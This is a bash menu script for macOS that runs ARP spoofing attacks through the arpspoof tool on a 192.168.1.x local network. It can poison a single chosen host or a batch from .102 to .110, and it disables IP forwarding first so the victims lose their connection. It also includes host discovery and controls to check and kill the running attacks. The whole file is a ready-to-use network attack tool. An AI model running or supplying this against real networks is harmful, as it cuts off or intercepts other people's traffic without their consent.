#!/bin/bash



### deps: libnet
### Source: https://github.com/SuperMarcus/macos-arpspoof.git

############################################################
status_fun(){
clear
echo -e ""
ps aux | grep 'sudo arpspoof -i'
echo -e ""
read
menu_fun
}

############################################################
killarps_fun(){
clear
echo -e ""
echo -e "    Kill Target IP ArpSpoof"
echo -e "    Target: 192.168.1.X"
echo -e "    Enter the X"
read TARGET
[[ "$TARGET" ]]
if [ "$TARGET" == "" ]; then
    exit
else
    PID=$(ps aux | grep 'sudo arpspoof -i' | grep $TARGET | awk '{print $2}')
    sudo kill $PID
    menu_fun
fi

}

############################################################
killall_fun(){
sudo killall arpspoof
menu_fun
}

############################################################
arpx_fun(){
clear
echo -e ""
echo -e "    ArpSpoof"
echo -e ""
echo -e "    Target HOST of the Attack"
echo -e "    Target: 192.168.1.102-110"
echo -e "    Press Enter to The Target"
echo -e "    OR Press 0 to return main"
read TARGET
[[ "$TARGET" ]]

if [ "$TARGET" == "0" ]; then
    menu_fun
else
    sudo sysctl -w net.inet.ip.forwarding=0

    sudo arpspoof -i en0 -t 192.168.1.1 192.168.1.102 > /dev/null &
    sudo arpspoof -i en0 -t 192.168.1.1 192.168.1.103 > /dev/null &
    sudo arpspoof -i en0 -t 192.168.1.1 192.168.1.104 > /dev/null &
    sudo arpspoof -i en0 -t 192.168.1.1 192.168.1.105 > /dev/null &
    sudo arpspoof -i en0 -t 192.168.1.1 192.168.1.106 > /dev/null &
    sudo arpspoof -i en0 -t 192.168.1.1 192.168.1.107 > /dev/null &
    sudo arpspoof -i en0 -t 192.168.1.1 192.168.1.108 > /dev/null &
    sudo arpspoof -i en0 -t 192.168.1.1 192.168.1.109 > /dev/null &
    sudo arpspoof -i en0 -t 192.168.1.1 192.168.1.110 > /dev/null &
fi

menu_fun

}

############################################################
arp_fun(){
clear
echo -e ""
echo -e "    ArpSpoof"
echo -e ""
echo -e "    Enter the Target HOST of the Attack"
echo -e "    Target: 192.168.1.X"
echo -e "    Enter the X"
echo -e "    OR Press 0 to return main"
read TARGET
[[ "$TARGET" ]]

if [ "$TARGET" == "0" ]; then
    menu_fun
else
    sudo sysctl -w net.inet.ip.forwarding=0
    sudo arpspoof -i en0 -t 192.168.1.1 192.168.1.$TARGET > /dev/null &
    menu_fun
fi

}

############################################################
host_list_fun(){
for ip in 192.168.1.{101..110}; do
  # delete old arp logs
  sudo arp -d $ip > /dev/null 2>&1
  # get new arp info
  ping -c 5 $ip > /dev/null 2>&1 &
done

# wait all ping end
wait

# MacOS ARP table
sudo arp -a | grep -v incomplete

read
menu_fun

}

############################################################
menu_fun(){
clear
echo -e ""
echo -e "    ArpSpoof Processes"
echo -e ""
echo -e "    1) ArpSpoof Attack X 102-110"
echo -e "    2) ArpSpoof Attack Target"
echo -e "    3) View Host list"
echo -e "    4) View ArpSpoof Status"
echo -e "    5) Kill Target IP ArpSpoof"
echo -e "    6) Kill ALL ArpSpoof"
echo -e "    0) exit"

read OPT
[[ "$OPT" ]]

if [ "$OPT" == "1" ]; then
    arpx_fun
elif [ "$OPT" == "2" ]; then
    arp_fun
elif [ "$OPT" == "3" ]; then
    host_list_fun
elif [ "$OPT" == "4" ]; then
    status_fun
elif [ "$OPT" == "5" ]; then
    killarps_fun
elif [ "$OPT" == "6" ]; then
    killall_fun
fi

}

menu_fun
